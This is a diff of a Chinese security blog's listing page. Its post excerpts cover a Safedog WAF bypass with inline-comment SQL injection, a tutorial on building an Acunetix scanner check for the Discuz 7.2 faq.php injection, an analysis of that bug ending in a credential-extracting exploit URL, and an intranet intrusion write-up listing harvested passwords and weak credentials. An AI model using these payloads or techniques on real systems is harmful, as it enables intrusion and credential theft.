@@ -1,724 +1,322 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-  <meta charset="utf-8">
-  
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
   <title>Blog of Secer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog of Secer">
-<meta property="og:url" content="http://id.cker.in/page/5/index.html">
-<meta property="og:site_name" content="Blog of Secer">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Blog of Secer">
-  
-    <link rel="alternate" href="/atom.xml" title="Blog of Secer" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
   
   
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
   
 
+  
 </head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Blog of Secer</a>
-      </h1>
-      
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://id.cker.in"></form>
-      </div>
-    </div>
-  </div>
 </header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-1089" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1089.seo/" class="article-date">
-  <time datetime="2014-07-03T01:53:48.000Z" itemprop="datePublished">2014-07-03</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
+      
+<main class="content" role="main">
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2015-04-27T06:39:14.000Z" itemprop="datePublished">
+          2015-04-27
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1089.seo/">全方位绕过安全狗</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><b>一、前言</b><b></b></p>  <p><a href="http://ha.cker.in/tag/安全狗" target="_blank">安全狗</a>是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现<a href="http://ha.cker.in/tag/安全狗" target="_blank">安全狗</a>的一些防护功能，例如<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。</p>  <p><b>二、测试环境</b><b></b></p>  <p>本次测试环境为</p>  <p>中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72</p>  <p>网站安全狗IIS版3.2.08417</p>  <p><b>三、SQL注入绕过</b><b></b></p>  <p>我们先写一个存在SQL注入漏洞的php：</p>  <p>&lt;?</p>  <p>$uid = $_REQUEST[‘id’];</p>  <p>if(!$conn = @mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;))</p>  <p>die(‘&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to connect to the database.’);</p>  <p>if(!@mysql_select_db(&quot;supe&quot;,$conn))</p>  <p>die(&quot;&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to find it at database on your MySQL server.&quot;);</p>  <p>$text = &quot;select <em> from supe_members where uid=&quot;.$uid;</p>  <p>$rs = mysql_query ($text,$conn);</p>  <p>while($rom = mysql_fetch_array($rs))</p>  <p>{</p>  <p>&#160;&#160;&#160; echo $rom[&quot;username&quot;];</p>  <p>}</p>  <p>?&gt;</p>  <p>我用的是supesite的库，可以看到这里是有明显<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞的，当没有安全狗的时候可以成功注入：</p>  <p><a href="http://img.cker.in/de86e6665f70_D948/clip_image001.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="injsuc.png" border="0" alt="全方位绕过安全狗" src="http://img.cker.in/de86e6665f70_D948/clip_image001_thumb.jpg" width="694" height="332" /></a></p>  <p>当安装安全狗之后，注入语句会被拦截：</p>  <p><a href="http://img.cker.in/de86e6665f70_D948/clip_image002.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="injfail.png" border="0" alt="全方位绕过安全狗" src="http://img.cker.in/de86e6665f70_D948/clip_image002_thumb.jpg" width="694" height="312" /></a></p>  <p>经过测试发现，安全狗这块的匹配正则应该是\s+and这类的，所以只要想办法去掉空格，用普通注释/**/是不行的，安全狗也防了这块。但是对内联注释/</em>!and<em>/这种不知道为什么安全狗没有拦截。</p>  <p>用下面语句成功绕过SQL注入过滤：</p>  <p><a href="http://192.168.200.115/inj.php?id=1/">http://192.168.200.115/inj.php?id=1/</a></em>!and<em>/1=2/</em>!union<em>//</em>!select*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17</p>  <p><a href="http://img.cker.in/de86e6665f70_D948/clip_image003.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="injbypass.png" border="0" alt="全方位绕过安全狗" src="http://img.cker.in/de86e6665f70_D948/clip_image003_thumb.jpg" width="694" height="350" /></a></p>  <p>有人说只有POST才可以，但是我测试最新版本的安全狗GET注入也是可以用这种方法绕过的。</p>  <p><b>四、文件上传绕过</b><b></b></p>  <p>安全狗的防上传也是做在WEB层，即分析HTTP协议来防止上传，按照yuange说的安全是一个条件语句，这显然是不符合安全规范的，只检查HTTP并不能保证文件系统层上的问题。</p><br>
-        
-          <p class="article-more-link">
-            <a href="/1089.seo/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1089.seo/" data-id="cirz4nzr6008noz76t72ia38a" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/安全狗/">安全狗</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1088" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1088.seo/" class="article-date">
-  <time datetime="2014-07-02T12:34:32.000Z" itemprop="datePublished">2014-07-02</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/原创文章/">原创文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+    | 
+    <a href='/tag/内网渗透/'>内网渗透</a>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1088.seo/">编写自己的Acunetix WVS漏洞脚本详细教程</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
+</span>
+      <h2 class="post-title"><a href="/1108.seo/">某内网渗透实例</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p>AWVS提供了自定义的脚本编程接口，可是网上的资料很少，只有官方的几篇介绍和参考手册，最近研究了一下怎么编写AWVS的漏洞脚本来写一篇简单性的文章，大家有兴趣的可以交流 <a href="http://shang.qq.com/wpa/qunwpa?idkey=4bcfd030ee01d86b163a1446997795e3dd9ea7e0419d350fedd7580f5bfbc343" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="加入 Ha.Cker.In QQ群讨论" border="0" alt="加入 Ha.Cker.In QQ群讨论" src="http://img.cker.in/AcunetixWVS_3815/clip_image001.png" width="94" height="26"></a>。</p>  <p>本文以8.0为例，首先呢安装好<a href="http://ha.cker.in/tag/Acunetix Web Vulnerability Scanner" target="_blank">Acunetix Web Vulnerability Scanner</a> 8（该破解的破解，该付费的付费），然后我们需要WVS公开的小小的SDK，下载地址：<a href="http://www.acunetix.com/download/tools/WVSSDK.zip" target="_blank" rel="external">http://www.acunetix.com/download/tools/WVSSDK.zip</a> ，下载好了后解压bin目录下的WVSS.exe到WVS安装目录下面，此即为WVS脚本编写工具。另外sdk里还有3个简单的脚本小例子和WVS_SDK_Quick_Introduction.pdf，耐心的可以看看。</p>  <p>下面的截图就是WVS码脚本工具了</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image003.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image003_thumb.jpg" width="580" height="407"></a></p>  <p>打开WVS数据目录，通常是在<b>C:\Documents and Settings\All Users\Application Data\Acunetix WVS 8\Data\Scripts</b>下，可以看到有10个文件夹，Network、PerFile、PerScheme、PostScan、PerFolder、PerServer、PostCrawl、WebApps、XML。我们先来认识一下：</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image005.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image005_thumb.jpg" width="580" height="227"></a></p>  <p>Network：此目录下的脚本文件是当扫描器完成了端口扫描模块后执行，这些脚本可以检测TCP端口的开放情况，比如检测FTP的21端口是否开放、是否允许匿名登录；</p>  <p>PerFile：此目录下的脚本是当扫描器爬虫爬到文件后执行，比如你可以检查当前测试文件是否存在备份文件，当前测试文件的内容等；</p>  <p>PerFolder：此目录下的脚本是当扫描器爬虫爬行到目录后执行，比如你可以检测当前测试目录是否存在列目录漏洞等；</p>  <p>PerScheme：此目录下的脚本会对每个URL的 GET、POST结构的参数进行检测，AWVS定义了的参数包括HTTP头、Cookies、GET/POST参数、文件上传(multipart/form-data)……比如你可以检测XSS、SQL注入和其他的应用程序测试；</p>  <p>PerServer：此目录下的脚本只在扫描开始是执行一次，比如你可以检测Web服务器中间件类型；</p>  <p>PostScan：此目录下的脚本只在扫描结束后执行一次，比如你可以检测存储型XSS、存储型SQL注入、存储型文件包含、存储型目录遍历、存储型代码执行、存储型文件篡改、存储型php代码执行等；</p>  <p>XML：漏洞的详细描述文档都在这里。</p>  <p>今天演示的漏洞是 <a href="http://ha.cker.in/tag/discuz" target="_blank">Discuz</a> 7.2的faq.php <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>，关于漏洞：<a href="http://ha.cker.in/1087.seo" target="_blank" rel="external">http://ha.cker.in/1087.seo</a></p>  <p>我们就用POC来写漏洞的脚本吧！</p>  <p>检测原理：</p>  <p>根据公开的POC构造出特殊请求，若存在 <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a> 则构造的SQL语句将会执行成功并在返回到响应内容，构造POC如下：</p>  <p>faq.php?action=grouppermission&amp;gids[99]=’&amp;gids[100][0]=)%20and%20(select%201%20from%20(select%20count(<em>),concat((select%200x4861636B656442795365636572),floor(rand(0)</em>2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23</p>  <p>利用截图，存在漏洞会返回“HackedBySecer”字样：</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image007.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image007_thumb.jpg" width="749" height="127"></a></p>  <p>&#160;</p>  <p>我们需要用WVS的脚本请求此URL并处理返回的内容，以此判断是否存在漏洞。</p>  <p>打开AWVS，Tools -&gt; Vulnerability Editor，右键VulnXMLs节点，选择‘Add Vulnerability’</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image009.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image009_thumb.jpg" width="253" height="205"></a></p>  <p>新建一个漏洞，VulnXML FILENAME为<b>Discuz7.2FaqSqlinjection</b>，点Add按钮（新建的VulnXML会被保存到XML文件夹下哦）</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image011.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image011_thumb.jpg" width="580" height="395"></a></p>  <p>接下来登记下该漏洞的相关信息</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image013.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image013_thumb.jpg" width="580" height="168"></a></p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image014.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image014_thumb.png" width="480" height="603"></a></p>  <p>然后进入wvss写脚本，保存为Discuz7.2FaqSqlinjection.script放入PerServer文件夹吧。</p>  <p>测试脚本：</p>  <p>使用AWVS的网站爬虫爬行网站并保存结果，</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image016.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image016_thumb.jpg" width="580" height="410"></a></p>  <p>这里选择根目录</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image018.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image018_thumb.jpg" width="580" height="499"></a></p>  <p>点击小三角按钮测试</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image020.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image020_thumb.jpg" width="199" height="141"></a></p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image022.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image022_thumb.jpg" width="580" height="339"></a></p>  <p>完整的代码如下</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image024.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image024_thumb.jpg" width="580" height="331"></a></p>  <p>测试成功了，我到WVS里扫描去测试扫描看看~</p>  <p>我们新建的漏洞脚本在这里，Scanning Profiles –》 PerFolder目录下，新建一个扫描模板勾选要测试的脚本并保存，这里保存为“test_HA.CKER.IN”，然后用这个模板扫描目标站测试吧</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image026.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image026_thumb.jpg" width="580" height="448"></a></p>  <p>选择模板并开始扫描</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image028.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image028_thumb.jpg" width="580" height="109"></a></p>  <p>扫描完成后，结果如图</p>  <p><a href="http://img.cker.in/AcunetixWVS_3815/clip_image030.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="编写自己的Acunetix WVS漏洞脚本详细教程" border="0" alt="编写自己的Acunetix WVS漏洞脚本详细教程" src="http://img.cker.in/AcunetixWVS_3815/clip_image030_thumb.jpg" width="580" height="354"></a></p>  <p>漏洞脚本重复检测了很多次，下次更新修复下这个问题。</p>  <p>本人不才，这次对AWVS自定义脚本编写简单的介绍就到这了，只是做个示例展示给大家，这些API不是很详细我也不是很会写，更多的API等你去挖掘吧！</p>  <p>参考：</p>  <p><a href="http://www.acunetix.com/vulnerability-scanner/scriptingreference/index.html" target="_blank" rel="external">http://www.acunetix.com/vulnerability-scanner/scriptingreference/index.html</a></p>  <p><a href="http://www.acunetix.com/blog/docs/creating-custom-checks-acunetix-web-vulnerability-scanner/" target="_blank" rel="external">http://www.acunetix.com/blog/docs/creating-custom-checks-acunetix-web-vulnerability-scanner/</a></p>
+        <p>1.外网入口:</p>  <p>目标:vlun.com[打码需要]</p>  <p>从m.vlun.com分站入手，发现有一个注入</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image001.png" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image001_thumb.png" width="591" height="180" /></a></p>  <p>直接备份一个webshell</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image003.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image003_thumb.jpg" width="580" height="393" /></a></p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image004.png" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image004_thumb.png" width="472" height="257" /></a></p>  <p>接着提权加抓密码的得到:</p>  <p>UserName: Administrator</p>  <p>password: vlun,123【之前的密码，也被抓下来了】</p>  <p>UserName: Administrator</p>  <p>password: vlun,54a【可以发现这个密码和ip有关！】</p>  <p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>  <p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>  <p>2.<a href="http://ha.cker.in/tag/内网渗透" target="_blank">内网渗透</a>:</p>  <p>2.1. 10.135.106.0/24段</p>  <p>本机在这个段，而且之前密码来看，密码和ip有关，</p>  <p>也就是说假设ip是10.135.106.108，那他的口令一个这样administrator:vlun,108a</p>  <p>So，密码将字典加入凤凰扫描器，开始扫描；</p>  <p>Result:</p>  <p>Mysql:</p>  <p>10.135.106.25 mysql at 3306 has weaken password!!——-root:123456</p>  <p>10.135.106.86 mysql at 3306 has weaken password!!——-root:root</p>  <p>Ssh:</p>  <p>10.135.106.245 ssh at 22 has weaken password!!——-root:vlun,123</p>  <p>Smb:</p>  <p>10.135.106.75 smb at 445 has weaken password!!——-administrator:vlun,123</p>  <p>10.135.106.160 smb at 445 has weaken password!!——-administrator:vlun,123</p>  <p>10.135.106.54 smb at 445 has weaken password!!——-administrator:vlun,54a</p>  <p>10.135.106.41 smb at 445 has weaken password!!——-administrator:vlun,41a</p>  <p>10.135.106.180 smb at 445 has weaken password!!——-administrator:vlun,180a</p>  <p>喜欢sock5代理，可以方便的用proxychains和proxifier连接。</p>  <p>想用hdtran做一个sockets代理，结果老给杀掉，直接用python写一个类似功能的，ssock_win.exe 做了sock5代理并反弹出来~</p>  <p>上图：</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image006.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image006_thumb.jpg" width="580" height="334" /></a></p><br>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1088.seo/" data-id="cirz4nzr4008joz76uezd6c2i" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1108.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Acunetix-Web-Vulnerability-Scanner/">Acunetix Web Vulnerability Scanner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Discuz/">Discuz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/SQL注入/">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1087" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1087.seo/" class="article-date">
-  <time datetime="2014-07-02T10:28:06.000Z" itemprop="datePublished">2014-07-02</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/Web安全/">Web安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2015-04-27T06:26:16.000Z" itemprop="datePublished">
+          2015-04-27
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1087.seo/">discuz7.2 faq.php 最新注入漏洞分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><b>discuz7.2 faq.php </b><b>最新注入漏洞分析</b><b></b></p>  <p>之前乌云上被提交的漏洞，今天突然被人发出来了，然后就各种中枪。奈何各种考试马上就来了，我也没工夫去写exp或脚本什么的，趁点休息时间把代码看看就好。实话说我很讨厌这种情况，一大堆人会的不会的拿着别人发的exp刷漏洞，刷分刷钱。不如静下心来分析一下漏洞产生的原因，也算是我吃不到葡萄在说葡萄酸吧，笑。</p>  <p>因为有同学给出POC了，POC如下：</p>  <p>&#160;&#160;&#160; <a href="http://www.xxx.com/faq.php?action=grouppermission&amp;gids[99]=&#39;&amp;gids[100][0]=" target="_blank" rel="external">http://www.xxx.com/faq.php?action=grouppermission&amp;gids[99]=&#39;&amp;gids[100][0]=</a>) and (select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema   <br>.tables group by x)a)%23 </p>  <p><a href="http://img.cker.in/discuz7.2faq.php_20EA/clip_image0011.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="点击查看原图" border="0" alt="clip_image001[1]" src="http://img.cker.in/discuz7.2faq.php_20EA/clip_image0011_thumb.jpg" width="654" height="281"></a></p>  <p>那么我把discuz7.2下载好，看到faq.php，找到action=grouppermission的代码（148行开始）：</p>  <p>} elseif($action == ‘grouppermission’) { </p>  <p>… </p>  <p>… </p>  <p>ksort($gids); </p>  <p>$groupids = array(); </p>  <p>foreach($gids as $row) { </p>  <p>$groupids[] = $row[0]; </p>  <p>} </p>  <p>$query = $db-&gt;query(&quot;SELECT <em> FROM {$tablepre}usergroups u LEFT JOIN {$tablepre}admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&quot;.implodeids($groupids).&quot;)&quot;);</em></p>  <p>看到，图中报错的注入语句就是上面这句话。所以特别看看这句话前面的代码，也就是我列出来的。</p>  <p>首先定义一个数组groupids，然后遍历$gids（这也是个数组，就是$_GET[gids]），将数组中的所有值的第一位取出来放在groupids中。</p>  <p>为什么这个操作就造成了注入？</p>  <p>&#160;&#160;&#160; discuz在全局会对GET数组进行addslashes转义，也就是说会将’转义成\’，所以，如果我们的传入的参数是：gids[1]=’的话，会被转义成$gids[1]=\’，而这个赋值语句$groupids[] = $row[0]就相当于取了字符串的第一个字符，也就是\，把转义符号取出来了。</p>  <p>再看后面，在将数据放入sql语句前，他用implodeids处理了一遍。我们看到implodeids函数：</p>  <p>function implodeids($array) { </p>  <p>if(!empty($array)) { </p>  <p>return &quot;’&quot;.implode(&quot;’,’&quot;, is_array($array) ? $array : array($array)).&quot;’&quot;; </p>  <p>} else { </p>  <p>return ‘’; </p>  <p>} </p>  <p>}</p>  <p>很简单一个函数，就是将刚才的$groupids数组用’,’分割开，组成一个类似于’1’,’2’,’3’,’4’的字符串返回。</p>  <p>但是我们的数组刚取出来一个转义符，它会将这里一个正常的’转义掉，比如这样：</p>  <p>&#160;&#160;&#160; ‘1’,’\’,’3’,’4’</p>  <p>有没有看出有点不同，第4个单引号被转义了，也就是说第5个单引号和第3个单引号闭合。这样3这个位置就等于逃逸出了单引号，也就是产生的注入。我们把报错语句放在3这个位置，就能报错：</p>  <p><a href="http://img.cker.in/discuz7.2faq.php_20EA/clip_image003.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/discuz7.2faq.php_20EA/clip_image003_thumb.jpg" width="789" height="138"></a></p>  <p><a href="http://www.leavesongs.com/discuz72-sql-injection.html" target="_blank" rel="external">http://www.leavesongs.com/discuz72-sql-injection.html</a></p>  <p>EXP：</p>  <p>faq.php?action=grouppermission&amp;gids[99]=%27&amp;gids[100][0]=) and (select 1 from (select count(),concat((select (select (select concat(username,0x27,password) from cdb_members limit 1) ) from <code>information_schema</code>.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1087.seo/" data-id="cirz4nzr2008foz7638xvkgws" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Discuz/">Discuz</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1086" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1086.seo/" class="article-date">
-  <time datetime="2014-07-02T09:47:48.000Z" itemprop="datePublished">2014-07-02</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+    | 
+    <a href='/tag/邮件注入/'>邮件注入</a>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1086.seo/">再谈SMB中继攻击</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
+</span>
+      <h2 class="post-title"><a href="/1107.seo/">实战]PHP邮件注入攻击技术</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
